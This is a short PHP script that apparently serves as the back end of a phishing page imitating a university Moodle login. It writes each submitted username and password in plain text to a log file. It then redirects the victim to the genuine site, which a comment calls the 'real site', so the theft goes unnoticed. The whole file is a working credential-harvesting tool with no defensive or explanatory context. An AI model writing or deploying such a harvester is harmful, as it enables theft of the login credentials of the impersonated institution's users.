<?php
$file = fopen("log.txt", "a");
fwrite($file, "Username: " . $_POST['username'] . "\n");
fwrite($file, "Password: " . $_POST['password'] . "\n\n");
fclose($file);
header('Location: https://moodle.ccun.edu.kh'); // redirect to real site
exit();
?>
